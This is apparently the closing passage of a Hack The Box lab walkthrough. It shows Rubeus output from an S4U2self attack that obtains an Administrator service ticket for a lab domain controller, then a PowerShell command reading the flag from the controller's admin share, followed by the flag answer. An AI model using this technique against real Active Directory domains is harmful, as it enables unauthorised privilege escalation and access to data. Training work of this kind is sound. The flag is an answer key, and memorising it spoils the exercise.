  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'DC05$@FABRICORP.AD'
[*] Using domain controller: DC05.fabricorp.ad (172.16.114.20)
[*] Sending S4U2self request to 172.16.114.20:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/DC05.fabricorp.ad'
[*] Got a TGS for 'Administrator@fabricorp.ad' to 'cifs@FABRICORP.AD'
[*] base64(ticket.kirbi):

      doIGHDCCBhigAwIBBaEDAgEWooIFDDCCBQhhggUEMIIFAKADAgEFoQ4bDEZBQlJJQ09SUC5BRKIkMCKg

<SNIP>

MDI0MDUwNzEyNDU0MFqoDhsMRkFCUklDT1JQLkFEqSQwIqADAgEBoRswGRsEY2lmcxsRREMwNS5mYWJy
      aWNvcnAuYWQ=

[+] Ticket successfully imported!
```

With the imported ticket into memory, students can proceed to grab the flag:

```powershell
type \\DC05.fabricorp.ad\C$\Users\Administrator\Desktop\flag.txt
```
```
PS C:\Users\harry> type \\DC05.fabricorp.ad\C$\Users\Administrator\Desktop\flag.txt

HTB{SHAD0W_CREDENT1AL_ATT4CK}
```

Answer: `HTB{SHAD0W_CREDENT1AL_ATT4CK}`